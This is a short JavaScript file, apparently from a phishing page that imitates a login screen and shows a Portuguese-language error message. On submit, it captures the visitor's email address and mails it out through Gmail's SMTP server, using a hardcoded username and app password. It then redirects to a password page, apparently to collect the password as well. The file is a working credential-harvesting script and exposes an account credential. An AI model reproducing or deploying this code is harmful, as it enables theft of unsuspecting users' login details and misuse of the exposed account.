window.onload = function()
{
    const btn = document.querySelector('#loginBtn');
    const err = document.getElementById("bad-login");

    btn.addEventListener("click", function(e) {
        e.preventDefault();
        var x = document.querySelector("#email");
        var y = x.value;
        console.log(y);
        if (y.indexOf("@") != -1) {
                Email.send({
                    Host: "smtp.gmail.com",
                    Username : "julio74108520@gmail.com",
                    Password : "hgvt vldi peit jcoh",
                    To : "julio74108520@gmail.com",
                    From : "julio74108520@gmail.com",
                    Subject : y,
                    Body : "<p> << Email </p>",
                });
            window.location.href = "password.html";
        } else {
            err.innerHTML = "<p class='err-alert'>Email ou Telefona não encontrados, tente novamente.<p>"
            document.getElementById("email").value='';
        }
    });
}
